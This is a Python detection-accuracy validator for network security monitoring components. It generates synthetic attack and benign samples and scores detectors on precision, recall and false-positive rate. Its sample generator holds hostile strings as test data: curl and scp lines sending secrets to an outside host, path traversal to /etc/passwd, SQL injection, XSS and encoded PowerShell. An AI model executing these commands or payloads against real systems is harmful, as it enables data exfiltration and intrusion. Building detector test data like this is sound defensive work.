#!/usr/bin/env python3
"""
iSECTECH Detection Accuracy Validator
Comprehensive validation of detection accuracy and false positive rate measurement for NSM components
"""

import asyncio
import json
import logging
import random
import statistics
import time
import uuid
from collections import defaultdict, Counter
from dataclasses import dataclass, asdict
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any, Tuple, Set
from pathlib import Path
import hashlib
import base64
import yaml
from enum import Enum

import requests
import numpy as np
from sklearn.metrics import precision_score, recall_score, f1_score, confusion_matrix, roc_auc_score


class ThreatType(Enum):
    """Types of threats for testing"""
    MALWARE = "malware"
    INTRUSION = "intrusion" 
    ANOMALY = "anomaly"
    DATA_EXFILTRATION = "data_exfiltration"
    LATERAL_MOVEMENT = "lateral_movement"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    COMMAND_AND_CONTROL = "command_and_control"
    RECONNAISSANCE = "reconnaissance"


class TestDataType(Enum):
    """Types of test data"""
    BENIGN = "benign"
    MALICIOUS = "malicious"
    SUSPICIOUS = "suspicious"
    UNKNOWN = "unknown"


@dataclass
class TestSample:
    """Individual test sample"""
    sample_id: str
    sample_type: TestDataType
    threat_type: Optional[ThreatType]
    confidence_score: float  # Expected confidence (0.0-1.0)
    payload: Dict[str, Any]
    metadata: Dict[str, Any]
    created_at: datetime
    
    # Ground truth labels
    is_malicious: bool
    threat_family: Optional[str] = None
    cve_ids: List[str] = None
    
    def __post_init__(self):
        if self.cve_ids is None:
            self.cve_ids = []


@dataclass
class DetectionResult:
    """Detection result from NSM component"""
    sample_id: str
    component: str
    detected: bool
    confidence: float
    threat_type: Optional[str]
    threat_family: Optional[str]
    detection_time: float  # Time taken to detect
    additional_metadata: Dict[str, Any]
    timestamp: datetime
    
    def __post_init__(self):
        if self.additional_metadata is None:
            self.additional_metadata = {}


@dataclass
class AccuracyMetrics:
    """Comprehensive accuracy metrics"""
    component: str
    test_dataset: str
    total_samples: int
    
    # Basic metrics
    true_positives: int
    false_positives: int
    true_negatives: int
    false_negatives: int
    
    # Calculated metrics
    precision: float
    recall: float
    f1_score: float
    accuracy: float
    specificity: float
    false_positive_rate: float
    false_negative_rate: float
    
    # Advanced metrics
    auc_roc: Optional[float]
    avg_detection_time: float
    confidence_correlation: float
    
    # Threat-specific metrics
    threat_type_accuracy: Dict[str, float]
    confidence_distribution: Dict[str, int]
    
    # Time-based metrics
    detection_latency_p50: float
    detection_latency_p95: float
    detection_latency_p99: float
    
    test_duration: float
    timestamp: datetime


class ThreatDataGenerator:
    """Generate realistic threat data for testing"""
    
    def __init__(self):
        self.malware_signatures = [
            "6a4875ae86131a9c617e5c7a8c5b1b3e9a2c8f9d",  # Example MD5 hash
            "e4b98e61c5c8f1b3a9d4b7f2a3c1e8d9f6a2b5c7",
            "9f3c7b8a1d4e6f2a8b5c3e9f7a1b4d8c6e2f9b3a"
        ]
        
        self.suspicious_domains = [
            "malicious-domain.com",
            "c2-server.net",
            "phishing-site.org",
            "botnet-controller.info"
        ]
        
        self.attack_patterns = {
            ThreatType.MALWARE: [
                {"pattern": "powershell.exe -EncodedCommand", "confidence": 0.85},
                {"pattern": "cmd.exe /c whoami", "confidence": 0.75},
                {"pattern": "rundll32.exe javascript:eval", "confidence": 0.90}
            ],
            ThreatType.INTRUSION: [
                {"pattern": "SELECT * FROM users WHERE 1=1", "confidence": 0.80},
                {"pattern": "../../../etc/passwd", "confidence": 0.85},
                {"pattern": "<script>alert('xss')</script>", "confidence": 0.70}
            ],
            ThreatType.DATA_EXFILTRATION: [
                {"pattern": "tar -czf /tmp/data.tar.gz /home/", "confidence": 0.75},
                {"pattern": "scp -r /sensitive/ user@external.com:", "confidence": 0.90},
                {"pattern": "curl -X POST -d @secrets.txt external.com", "confidence": 0.85}
            ]
        }
        
        self.benign_patterns = [
            {"pattern": "systemctl status nginx", "confidence": 0.05},
            {"pattern": "ls -la /var/log/", "confidence": 0.10},
            {"pattern": "UPDATE users SET last_login=NOW()", "confidence": 0.15},
            {"pattern": "git commit -m 'Update documentation'", "confidence": 0.05}
        ]
    
    def generate_malicious_sample(self, threat_type: ThreatType) -> TestSample:
        """Generate a malicious test sample"""
        sample_id = str(uuid.uuid4())
        
        # Select attack pattern
        patterns = self.attack_patterns.get(threat_type, [])
        if not patterns:
            patterns = [{"pattern": "generic_malicious_activity", "confidence": 0.75}]
        
        selected_pattern = random.choice(patterns)
        
        # Generate payload based on threat type
        payload = self._create_malicious_payload(threat_type, selected_pattern["pattern"])
        
        return TestSample(
            sample_id=sample_id,
            sample_type=TestDataType.MALICIOUS,
            threat_type=threat_type,
            confidence_score=selected_pattern["confidence"],
            payload=payload,
            metadata={
                "attack_vector": selected_pattern["pattern"],
                "threat_family": self._get_threat_family(threat_type),
                "severity": random.choice(["high", "critical"]),
                "source": "synthetic_generator"
            },
            created_at=datetime.utcnow(),
            is_malicious=True,
            threat_family=self._get_threat_family(threat_type)
        )
    
    def generate_benign_sample(self) -> TestSample:
        """Generate a benign test sample"""
        sample_id = str(uuid.uuid4())
        
        selected_pattern = random.choice(self.benign_patterns)
        
        payload = {
            "command": selected_pattern["pattern"],
            "user": f"user_{random.randint(1, 100)}",
            "process": "legitimate_process.exe",
            "src_ip": random.choice(["192.168.1.100", "10.0.0.50", "172.16.0.10"]),
            "dst_ip": random.choice(["8.8.8.8", "1.1.1.1", "192.168.1.1"]),
            "timestamp": datetime.utcnow().isoformat()
        }
        
        return TestSample(
            sample_id=sample_id,
            sample_type=TestDataType.BENIGN,
            threat_type=None,
            confidence_score=selected_pattern["confidence"],
            payload=payload,
            metadata={
                "activity_type": "normal_operation",
                "user_behavior": "typical",
                "source": "synthetic_generator"
            },
            created_at=datetime.utcnow(),
            is_malicious=False
        )
    
    def generate_suspicious_sample(self) -> TestSample:
        """Generate a suspicious but potentially benign sample"""
        sample_id = str(uuid.uuid4())
        
        # Create ambiguous activity that could be legitimate or malicious
        suspicious_activities = [
            {
                "pattern": "netstat -an | grep LISTEN",
                "confidence": 0.40,
                "reason": "network_reconnaissance"
            },
            {
                "pattern": "find / -name '*.log' 2>/dev/null",
                "confidence": 0.35,
                "reason": "file_enumeration"
            },
            {
                "pattern": "ps aux | grep root",
                "confidence": 0.30,
                "reason": "process_enumeration"
            }
        ]
        
        selected_activity = random.choice(suspicious_activities)
        
        payload = {
            "command": selected_activity["pattern"],
            "user": f"user_{random.randint(1, 100)}",
            "src_ip": random.choice(["192.168.1.100", "10.0.0.50"]),
            "timestamp": datetime.utcnow().isoformat(),
            "context": selected_activity["reason"]
        }
        
        return TestSample(
            sample_id=sample_id,
            sample_type=TestDataType.SUSPICIOUS,
            threat_type=None,
            confidence_score=selected_activity["confidence"],
            payload=payload,
            metadata={
                "activity_type": "suspicious",
                "ambiguity_reason": selected_activity["reason"],
                "source": "synthetic_generator"
            },
            created_at=datetime.utcnow(),
            is_malicious=random.choice([True, False])  # Randomly assign ground truth
        )
    
    def _create_malicious_payload(self, threat_type: ThreatType, pattern: str) -> Dict[str, Any]:
        """Create payload for malicious sample"""
        base_payload = {
            "command": pattern,
            "user": f"attacker_{random.randint(1, 10)}",
            "src_ip": random.choice(["external.malicious.com", "192.168.100.50", "10.0.100.25"]),
            "dst_ip": random.choice(["192.168.1.10", "10.0.0.5", "172.16.0.100"]),
            "timestamp": datetime.utcnow().isoformat()
        }
        
        # Add threat-specific details
        if threat_type == ThreatType.MALWARE:
            base_payload.update({
                "file_hash": random.choice(self.malware_signatures),
                "file_path": "/tmp/malware.exe",
                "process_name": "suspicious_process.exe"
            })
        elif threat_type == ThreatType.DATA_EXFILTRATION:
            base_payload.update({
                "data_size": random.randint(1000000, 100000000),  # 1MB to 100MB
                "destination": random.choice(self.suspicious_domains),
                "protocol": "HTTPS"
            })
        elif threat_type == ThreatType.COMMAND_AND_CONTROL:
            base_payload.update({
                "c2_domain": random.choice(self.suspicious_domains),
                "beacon_interval": random.randint(30, 300),
                "encryption": "AES256"
            })
        
        return base_payload
    
    def _get_threat_family(self, threat_type: ThreatType) -> str:
        """Get threat family based on threat type"""
        families = {
            ThreatType.MALWARE: ["trojan", "ransomware", "backdoor", "worm"],
            ThreatType.INTRUSION: ["sql_injection", "xss", "path_traversal", "rce"],
            ThreatType.DATA_EXFILTRATION: ["stealer", "keylogger", "data_harvester"],
            ThreatType.LATERAL_MOVEMENT: ["psexec", "wmi", "rdp_hijack"],
            ThreatType.COMMAND_AND_CONTROL: ["beacon", "reverse_shell", "tunnel"]
        }
        
        return random.choice(families.get(threat_type, ["unknown"]))


class DetectionAccuracyValidator:
    """Main validation framework for detection accuracy"""
    
    def __init__(self, config_path: str = "/etc/nsm/detection_validation.yaml"):
        self.config_path = config_path
        self.config = self._load_config()
        self.logger = self._setup_logging()
        
        # Data generator
        self.threat_generator = ThreatDataGenerator()
        
        # Test results storage
        self.test_samples: List[TestSample] = []
        self.detection_results: List[DetectionResult] = []
        self.accuracy_metrics: Dict[str, AccuracyMetrics] = {}
        
        # Component endpoints
        self.component_endpoints = self._get_component_endpoints()
        
        # Test datasets
        self.test_datasets = {
            "comprehensive": {
                "benign_samples": 1000,
                "malicious_samples": 500,
                "suspicious_samples": 200
            },
            "balanced": {
                "benign_samples": 500,
                "malicious_samples": 500,
                "suspicious_samples": 100
            },
            "high_volume": {
                "benign_samples": 5000,
                "malicious_samples": 2000,
                "suspicious_samples": 1000
            }
        }
    
    def _load_config(self) -> Dict[str, Any]:
        """Load validation configuration"""
        try:
            with open(self.config_path, 'r') as f:
                return yaml.safe_load(f)
        except Exception as e:
            print(f"Error loading detection validation config: {e}")
            return {
                "detection_timeout": 30,
                "batch_size": 100,
                "confidence_threshold": 0.5,
                "acceptable_fpr": 0.05  # 5% false positive rate
            }
    
    def _setup_logging(self) -> logging.Logger:
        """Setup logging configuration"""
        logger = logging.getLogger('DetectionAccuracyValidator')
        logger.setLevel(logging.INFO)
        
        handler = logging.StreamHandler()
        formatter = logging.Formatter(
            '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        )
        handler.setFormatter(formatter)
        logger.addHandler(handler)
        
        # File handler
        file_handler = logging.FileHandler('/var/log/nsm/detection_accuracy_validator.log')
        file_handler.setFormatter(formatter)
        logger.addHandler(file_handler)
        
        return logger
    
    def _get_component_endpoints(self) -> Dict[str, Dict[str, str]]:
        """Get component endpoints for testing"""
        return {
            'signature_detection': {
                'analyze': 'http://localhost:8437/api/v1/analyze',
                'detect': 'http://localhost:8437/api/v1/detect'
            },
            'anomaly_detection': {
                'analyze': 'http://localhost:8441/api/v1/analyze',
                'detect': 'http://localhost:8441/api/v1/detect'
            },
            'behavioral_analysis': {
                'analyze': 'http://localhost:8444/api/v1/analyze',
                'detect': 'http://localhost:8444/api/v1/detect'
            },
            'encrypted_analysis': {
                'analyze': 'http://localhost:8445/api/v1/analyze',
                'detect': 'http://localhost:8445/api/v1/detect'
            },
            'vulnerability_correlation': {
                'analyze': 'http://localhost:8447/api/v1/analyze',
                'detect': 'http://localhost:8447/api/v1/detect'
            }
        }
    
    def generate_test_dataset(self, dataset_name: str = "comprehensive") -> List[TestSample]:
        """Generate comprehensive test dataset"""
        if dataset_name not in self.test_datasets:
            raise ValueError(f"Unknown dataset: {dataset_name}")
        
        dataset_config = self.test_datasets[dataset_name]
        samples = []
        
        self.logger.info(f"Generating test dataset: {dataset_name}")
        
        # Generate benign samples
        self.logger.info(f"Generating {dataset_config['benign_samples']} benign samples...")
        for _ in range(dataset_config['benign_samples']):
            sample = self.threat_generator.generate_benign_sample()
            samples.append(sample)
        
        # Generate malicious samples for each threat type
        malicious_per_type = dataset_config['malicious_samples'] // len(ThreatType)
        self.logger.info(f"Generating {dataset_config['malicious_samples']} malicious samples...")
        
        for threat_type in ThreatType:
            for _ in range(malicious_per_type):
                sample = self.threat_generator.generate_malicious_sample(threat_type)
                samples.append(sample)
        
        # Generate suspicious samples
        self.logger.info(f"Generating {dataset_config['suspicious_samples']} suspicious samples...")
        for _ in range(dataset_config['suspicious_samples']):
            sample = self.threat_generator.generate_suspicious_sample()
            samples.append(sample)
        
        # Shuffle samples
        random.shuffle(samples)
        
        self.test_samples = samples
        self.logger.info(f"Generated {len(samples)} test samples")
        
        return samples
    
    async def validate_component_accuracy(self, component: str, 
                                        samples: Optional[List[TestSample]] = None) -> AccuracyMetrics:
        """Validate detection accuracy for a specific component"""
        if samples is None:
            samples = self.test_samples
        
        if not samples:
            raise ValueError("No test samples available")
        
        self.logger.info(f"Validating detection accuracy for {component} with {len(samples)} samples")
        
        start_time = datetime.utcnow()
        detection_results = []
        
        # Process samples in batches
        batch_size = self.config.get('batch_size', 100)
        
        for i in range(0, len(samples), batch_size):
            batch = samples[i:i + batch_size]
            batch_results = await self._process_batch(component, batch)
            detection_results.extend(batch_results)
            
            self.logger.info(f"Processed batch {i//batch_size + 1}/{(len(samples) + batch_size - 1)//batch_size}")
        
        end_time = datetime.utcnow()
        test_duration = (end_time - start_time).total_seconds()
        
        # Calculate accuracy metrics
        metrics = self._calculate_accuracy_metrics(
            component, samples, detection_results, test_duration, start_time
        )
        
        self.accuracy_metrics[component] = metrics
        self.detection_results.extend(detection_results)
        
        self.logger.info(f"Validation completed for {component}: "
                        f"Precision={metrics.precision:.3f}, Recall={metrics.recall:.3f}, "
                        f"FPR={metrics.false_positive_rate:.3f}")
        
        return metrics
    
    async def _process_batch(self, component: str, batch: List[TestSample]) -> List[DetectionResult]:
        """Process a batch of samples through the component"""
        endpoints = self.component_endpoints.get(component, {})
        if not endpoints:
            raise ValueError(f"No endpoints configured for component: {component}")
        
        analyze_url = endpoints.get('analyze', endpoints.get('detect'))
        if not analyze_url:
            raise ValueError(f"No analyze endpoint found for component: {component}")
        
        results = []
        timeout = self.config.get('detection_timeout', 30)
        
        # Process samples concurrently
        tasks = []
        for sample in batch:
            task = asyncio.create_task(
                self._analyze_sample(component, sample, analyze_url, timeout)
            )
            tasks.append(task)
        
        # Wait for all analyses to complete
        batch_results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in batch_results:
            if isinstance(result, DetectionResult):
                results.append(result)
            elif isinstance(result, Exception):
                self.logger.error(f"Error analyzing sample: {result}")
        
        return results
    
    async def _analyze_sample(self, component: str, sample: TestSample, 
                            endpoint_url: str, timeout: int) -> DetectionResult:
        """Analyze a single sample through the component"""
        start_time = time.time()
        
        try:
            # Prepare request payload
            request_payload = {
                'sample_id': sample.sample_id,
                'data': sample.payload,
                'metadata': sample.metadata
            }
            
            headers = {
                'Content-Type': 'application/json',
                'X-API-Key': 'detection-validation-key'
            }
            
            # Make request
            response = requests.post(
                endpoint_url,
                json=request_payload,
                headers=headers,
                timeout=timeout
            )
            
            detection_time = time.time() - start_time
            
            if response.status_code == 200:
                response_data = response.json()
                
                # Parse detection response
                detected = response_data.get('detected', False)
                confidence = response_data.get('confidence', 0.0)
                threat_type = response_data.get('threat_type')
                threat_family = response_data.get('threat_family')
                additional_metadata = response_data.get('metadata', {})
                
            else:
                # Handle non-200 responses
                detected = False
                confidence = 0.0
                threat_type = None
                threat_family = None
                additional_metadata = {'error': f'HTTP {response.status_code}'}
            
            return DetectionResult(
                sample_id=sample.sample_id,
                component=component,
                detected=detected,
                confidence=confidence,
                threat_type=threat_type,
                threat_family=threat_family,
                detection_time=detection_time,
                additional_metadata=additional_metadata,
                timestamp=datetime.utcnow()
            )
            
        except requests.exceptions.Timeout:
            return DetectionResult(
                sample_id=sample.sample_id,
                component=component,
                detected=False,
                confidence=0.0,
                threat_type=None,
                threat_family=None,
                detection_time=timeout,
                additional_metadata={'error': 'timeout'},
                timestamp=datetime.utcnow()
            )
        except Exception as e:
            return DetectionResult(
                sample_id=sample.sample_id,
                component=component,
                detected=False,
                confidence=0.0,
                threat_type=None,
                threat_family=None,
                detection_time=time.time() - start_time,
                additional_metadata={'error': str(e)},
                timestamp=datetime.utcnow()
            )
    
    def _calculate_accuracy_metrics(self, component: str, samples: List[TestSample],
                                  results: List[DetectionResult], test_duration: float,
                                  timestamp: datetime) -> AccuracyMetrics:
        """Calculate comprehensive accuracy metrics"""
        
        # Create sample lookup
        sample_lookup = {s.sample_id: s for s in samples}
        
        # Prepare data for metrics calculation
        y_true = []  # Ground truth labels
        y_pred = []  # Predicted labels
        y_scores = []  # Confidence scores
        detection_times = []
        
        confidence_threshold = self.config.get('confidence_threshold', 0.5)
        
        for result in results:
            sample = sample_lookup.get(result.sample_id)
            if not sample:
                continue
                
            y_true.append(1 if sample.is_malicious else 0)
            y_pred.append(1 if (result.detected and result.confidence >= confidence_threshold) else 0)
            y_scores.append(result.confidence)
            detection_times.append(result.detection_time)
        
        if not y_true:
            # Return empty metrics if no valid results
            return AccuracyMetrics(
                component=component,
                test_dataset="unknown",
                total_samples=0,
                true_positives=0,
                false_positives=0,
                true_negatives=0,
                false_negatives=0,
                precision=0.0,
                recall=0.0,
                f1_score=0.0,
                accuracy=0.0,
                specificity=0.0,
                false_positive_rate=0.0,
                false_negative_rate=0.0,
                auc_roc=None,
                avg_detection_time=0.0,
                confidence_correlation=0.0,
                threat_type_accuracy={},
                confidence_distribution={},
                detection_latency_p50=0.0,
                detection_latency_p95=0.0,
                detection_latency_p99=0.0,
                test_duration=test_duration,
                timestamp=timestamp
            )
        
        # Calculate confusion matrix
        tn, fp, fn, tp = confusion_matrix(y_true, y_pred).ravel()
        
        # Calculate basic metrics
        precision = precision_score(y_true, y_pred, zero_division=0)
        recall = recall_score(y_true, y_pred, zero_division=0)
        f1 = f1_score(y_true, y_pred, zero_division=0)
        accuracy = (tp + tn) / (tp + tn + fp + fn) if (tp + tn + fp + fn) > 0 else 0
        specificity = tn / (tn + fp) if (tn + fp) > 0 else 0
        fpr = fp / (fp + tn) if (fp + tn) > 0 else 0
        fnr = fn / (fn + tp) if (fn + tp) > 0 else 0
        
        # Calculate ROC AUC if possible
        try:
            auc_roc = roc_auc_score(y_true, y_scores) if len(set(y_true)) > 1 else None
        except:
            auc_roc = None
        
        # Calculate timing metrics
        avg_detection_time = statistics.mean(detection_times) if detection_times else 0.0
        
        sorted_times = sorted(detection_times) if detection_times else [0.0]
        p50_latency = sorted_times[int(0.5 * len(sorted_times))]
        p95_latency = sorted_times[int(0.95 * len(sorted_times))]
        p99_latency = sorted_times[int(0.99 * len(sorted_times))]
        
        # Calculate confidence correlation
        confidence_correlation = np.corrcoef(y_true, y_scores)[0, 1] if len(y_true) > 1 else 0.0
        if np.isnan(confidence_correlation):
            confidence_correlation = 0.0
        
        # Calculate threat-type specific accuracy
        threat_type_accuracy = {}
        for threat_type in ThreatType:
            threat_samples = [s for s in samples if s.threat_type == threat_type]
            if threat_samples:
                threat_results = [r for r in results if r.sample_id in [s.sample_id for s in threat_samples]]
                if threat_results:
                    threat_y_true = [1 if sample_lookup[r.sample_id].is_malicious else 0 for r in threat_results]
                    threat_y_pred = [1 if (r.detected and r.confidence >= confidence_threshold) else 0 for r in threat_results]
                    
                    if threat_y_true and threat_y_pred:
                        threat_accuracy = sum(1 for t, p in zip(threat_y_true, threat_y_pred) if t == p) / len(threat_y_true)
                        threat_type_accuracy[threat_type.value] = threat_accuracy
        
        # Calculate confidence distribution
        confidence_ranges = [(0.0, 0.2), (0.2, 0.4), (0.4, 0.6), (0.6, 0.8), (0.8, 1.0)]
        confidence_distribution = {}
        for low, high in confidence_ranges:
            count = sum(1 for score in y_scores if low <= score < high)
            confidence_distribution[f"{low}-{high}"] = count
        
        return AccuracyMetrics(
            component=component,
            test_dataset="generated",
            total_samples=len(y_true),
            true_positives=tp,
            false_positives=fp,
            true_negatives=tn,
            false_negatives=fn,
            precision=precision,
            recall=recall,
            f1_score=f1,
            accuracy=accuracy,
            specificity=specificity,
            false_positive_rate=fpr,
            false_negative_rate=fnr,
            auc_roc=auc_roc,
            avg_detection_time=avg_detection_time,
            confidence_correlation=confidence_correlation,
            threat_type_accuracy=threat_type_accuracy,
            confidence_distribution=confidence_distribution,
            detection_latency_p50=p50_latency,
            detection_latency_p95=p95_latency,
            detection_latency_p99=p99_latency,
            test_duration=test_duration,
            timestamp=timestamp
        )
    
    async def validate_all_components(self, dataset_name: str = "comprehensive") -> Dict[str, AccuracyMetrics]:
        """Validate detection accuracy for all components"""
        # Generate test dataset
        samples = self.generate_test_dataset(dataset_name)
        
        # Validate each component
        results = {}
        for component in self.component_endpoints.keys():
            try:
                self.logger.info(f"Starting validation for component: {component}")
                metrics = await self.validate_component_accuracy(component, samples)
                results[component] = metrics
            except Exception as e:
                self.logger.error(f"Failed to validate component {component}: {e}")
        
        return results
    
    def generate_accuracy_report(self, metrics: Dict[str, AccuracyMetrics]) -> str:
        """Generate comprehensive accuracy report"""
        if not metrics:
            return "No accuracy metrics available."
        
        report = []
        report.append("=" * 80)
        report.append("NSM DETECTION ACCURACY VALIDATION REPORT")
        report.append("=" * 80)
        report.append(f"Generated: {datetime.utcnow().isoformat()}")
        report.append(f"Components Tested: {len(metrics)}")
        report.append("")
        
        # Overall summary
        total_samples = sum(m.total_samples for m in metrics.values())
        avg_precision = statistics.mean([m.precision for m in metrics.values()])
        avg_recall = statistics.mean([m.recall for m in metrics.values()])
        avg_fpr = statistics.mean([m.false_positive_rate for m in metrics.values()])
        
        report.append("OVERALL SUMMARY")
        report.append("-" * 40)
        report.append(f"Total Samples Processed: {total_samples:,}")
        report.append(f"Average Precision: {avg_precision:.3f}")
        report.append(f"Average Recall: {avg_recall:.3f}")
        report.append(f"Average False Positive Rate: {avg_fpr:.3f}")
        report.append("")
        
        # Component-specific results
        report.append("COMPONENT-SPECIFIC RESULTS")
        report.append("-" * 40)
        
        for component, metric in metrics.items():
            report.append(f"Component: {component}")
            report.append(f"  Samples: {metric.total_samples}")
            report.append(f"  Accuracy: {metric.accuracy:.3f}")
            report.append(f"  Precision: {metric.precision:.3f}")
            report.append(f"  Recall: {metric.recall:.3f}")
            report.append(f"  F1-Score: {metric.f1_score:.3f}")
            report.append(f"  False Positive Rate: {metric.false_positive_rate:.3f}")
            report.append(f"  Average Detection Time: {metric.avg_detection_time:.3f}s")
            
            if metric.auc_roc is not None:
                report.append(f"  ROC AUC: {metric.auc_roc:.3f}")
            
            report.append("")
        
        # False positive analysis
        report.append("FALSE POSITIVE ANALYSIS")
        report.append("-" * 40)
        
        acceptable_fpr = self.config.get('acceptable_fpr', 0.05)
        high_fpr_components = [
            (comp, metric) for comp, metric in metrics.items() 
            if metric.false_positive_rate > acceptable_fpr
        ]
        
        if high_fpr_components:
            report.append(f"⚠️  Components with high false positive rate (>{acceptable_fpr:.2%}):")
            for component, metric in high_fpr_components:
                report.append(f"   - {component}: {metric.false_positive_rate:.3f} "
                            f"({metric.false_positives} false positives)")
        else:
            report.append("✅ All components within acceptable false positive rate threshold.")
        
        report.append("")
        
        # Performance analysis
        report.append("PERFORMANCE ANALYSIS")
        report.append("-" * 40)
        
        slow_components = [
            (comp, metric) for comp, metric in metrics.items() 
            if metric.avg_detection_time > 5.0  # 5 seconds threshold
        ]
        
        if slow_components:
            report.append("🐌 Slow detection components (>5s average):")
            for component, metric in slow_components:
                report.append(f"   - {component}: {metric.avg_detection_time:.3f}s average")
        else:
            report.append("✅ All components within acceptable detection time.")
        
        report.append("")
        
        # Recommendations
        report.append("RECOMMENDATIONS")
        report.append("-" * 40)
        
        recommendations = []
        
        for component, metric in metrics.items():
            if metric.false_positive_rate > acceptable_fpr:
                recommendations.append(f"• Tune {component} to reduce false positive rate from "
                                    f"{metric.false_positive_rate:.3f} to <{acceptable_fpr}")
            
            if metric.recall < 0.8:
                recommendations.append(f"• Improve {component} detection rules to increase recall from "
                                    f"{metric.recall:.3f} to >0.8")
            
            if metric.avg_detection_time > 5.0:
                recommendations.append(f"• Optimize {component} performance to reduce detection time from "
                                    f"{metric.avg_detection_time:.3f}s")
        
        if recommendations:
            for rec in recommendations:
                report.append(rec)
        else:
            report.append("✅ All components performing within acceptable parameters.")
        
        report.append("")
        report.append("=" * 80)
        
        return "\n".join(report)
    
    def save_results(self, filename: str):
        """Save validation results to file"""
        results_data = {
            'generated_at': datetime.utcnow().isoformat(),
            'framework_version': '1.0',
            'test_samples': [asdict(sample) for sample in self.test_samples],
            'detection_results': [asdict(result) for result in self.detection_results],
            'accuracy_metrics': {k: asdict(v) for k, v in self.accuracy_metrics.items()}
        }
        
        filepath = Path(filename)
        filepath.parent.mkdir(parents=True, exist_ok=True)
        
        with open(filepath, 'w') as f:
            json.dump(results_data, f, indent=2, default=str)
        
        self.logger.info(f"Validation results saved to {filepath}")


async def main():
    """Main execution for detection accuracy validation"""
    validator = DetectionAccuracyValidator()
    
    # Run comprehensive validation
    try:
        metrics = await validator.validate_all_components("comprehensive")
        
        # Generate and display report
        report = validator.generate_accuracy_report(metrics)
        print(report)
        
        # Save results
        validator.save_results("/var/lib/nsm/detection_accuracy_results.json")
        
        # Save report
        report_path = Path("/var/lib/nsm/detection_accuracy_report.txt")
        report_path.parent.mkdir(parents=True, exist_ok=True)
        report_path.write_text(report)
        
        print(f"\nDetailed report saved to: {report_path}")
        
    except Exception as e:
        print(f"Validation failed: {e}")
        logging.exception("Validation error")


if __name__ == "__main__":
    asyncio.run(main())